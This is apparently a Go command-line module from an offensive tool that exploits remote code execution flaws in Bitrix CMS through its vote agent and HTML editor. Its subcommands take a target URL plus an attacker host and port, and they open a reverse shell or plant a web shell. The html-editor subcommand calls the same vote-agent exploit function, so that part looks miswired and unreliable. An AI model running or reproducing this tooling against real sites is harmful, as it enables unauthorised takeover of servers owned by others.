package cmd

import (
	"github.com/spf13/cobra"
	"quick-tricks/modules/rce/va"
	"quick-tricks/utils/colors"
)

// rceCmd represents the rce command
var rceCmd = &cobra.Command{
	Use:   "rce",
	Short: "Module 'rce' tries to exploit vulnerable components of the target Bitrix.",
	Run: func(cmd *cobra.Command, args []string) {
		cmd.Usage()
	},
}

// voteCmd represents the vote-agent subcommand.
var voteCmd = &cobra.Command{
	Use:   "vote-agent",
	Short: "Exploit RCE via vote agent (Bitrix <= 21.400.100).",
	Run: func(cmd *cobra.Command, args []string) {
		webshell, _ := cmd.Flags().GetBool("web-shell")
		target, _ := cmd.Flags().GetString("url")
		lhost, _ := cmd.Flags().GetString("lhost")
		lport, _ := cmd.Flags().GetString("lport")
		agentId, _ := cmd.Flags().GetString("agentId")
		_, _, err := va.Exploit(target, lhost, lport, agentId, webshell)
		if err != nil {
			colors.BAD.Println(err)
		}
	},
}

// voteCmd represents the vote-agent subcommand.
var editorCmd = &cobra.Command{
	Use:   "html-editor",
	Short: "Exploit RCE via html editor (Bitrix <= 20.100.0).",
	Run: func(cmd *cobra.Command, args []string) {
		webshell, _ := cmd.Flags().GetBool("web-shell")
		target, _ := cmd.Flags().GetString("url")
		lhost, _ := cmd.Flags().GetString("lhost")
		lport, _ := cmd.Flags().GetString("lport")
		agentId, _ := cmd.Flags().GetString("agentId")
		_, _, err := va.Exploit(target, lhost, lport, agentId, webshell)
		if err != nil {
			colors.BAD.Println(err)
		}
	},
}

func init() {
	rootCmd.AddCommand(rceCmd)
	rceCmd.AddCommand(voteCmd)
	rceCmd.AddCommand(editorCmd)

	// TODO: IS THERE AN ELEGANT WAY TO COMBINE THE SAME FLAGS FOR THE DIFFERENT SUBCOMMANDS?
	voteCmd.PersistentFlags().StringP("url", "u", "", "Target Bitrix site")
	voteCmd.MarkFlagRequired("url")
	voteCmd.PersistentFlags().String("lhost", "", "IP address for reverse connection")
	voteCmd.MarkFlagRequired("lhost")
	voteCmd.PersistentFlags().String("lport", "", "Port of the host that listens for reverse connection")
	voteCmd.MarkFlagRequired("lport")
	voteCmd.Flags().String("agentId", "4", "ID of vote module agent (2,4 and 7 are available)")
	voteCmd.Flags().Bool("web-shell", false, "Use web shell instead of console reverse shell.")

	editorCmd.PersistentFlags().StringP("url", "u", "", "Target Bitrix site")
	editorCmd.MarkFlagRequired("url")
	editorCmd.PersistentFlags().String("lhost", "", "IP address for reverse connection")
	editorCmd.MarkFlagRequired("lhost")
	editorCmd.PersistentFlags().String("lport", "", "Port of the host that listens for reverse connection")
	editorCmd.MarkFlagRequired("lport")
}
